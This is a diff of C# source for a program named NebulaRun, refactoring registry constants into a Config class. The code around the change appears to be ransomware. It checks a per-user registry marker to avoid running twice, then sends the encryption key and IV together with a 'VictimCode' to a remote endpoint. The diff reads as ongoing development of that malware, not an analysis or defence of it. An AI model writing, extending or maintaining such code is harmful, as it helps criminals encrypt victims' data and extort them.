@@ -11,10 +11,6 @@ namespace NebulaRun
 {
 internal static class Program
 {
-    private const string RegKeyPath = @"Software\NebulaRun";
-    private const string RegValueName = "Marked";
-    private const string RegValueData = "1";
-
         [STAThread]
         private static void Main()
         {
@@ -64,9 +60,9 @@ internal static class Program
                                 bool alreadyMarked = false;
                                 try
                                 {
-                                        using (RegistryKey key = Registry.CurrentUser.OpenSubKey(RegKeyPath))
+                                        using (RegistryKey key = Registry.CurrentUser.OpenSubKey(Config.RegKeyPath))
                                         {
-                                                if (key != null && key.GetValue(RegValueName) != null)
+                                                if (key != null && key.GetValue(Config.RegValueName) != null)
                                                 {
                                                         alreadyMarked = true;
                                                 }
@@ -86,11 +82,11 @@ internal static class Program
                                                 Task.Delay(4000).Wait();
                                                 Send.SendKeyAndIvAsync(Nbl.GetBase64Key(), Nbl.GetBase64IV(), Nbl.VictimCode);
 
-                                                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(RegKeyPath))
+                                                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(Config.RegKeyPath))
                                                 {
                                                         if (key != null)
                                                         {
-                                                                key.SetValue(RegValueName, RegValueData, RegistryValueKind.String);
+                                                                key.SetValue(Config.RegValueName, Config.RegValueData, RegistryValueKind.String);
                                                         }
                                                 }
                                         }
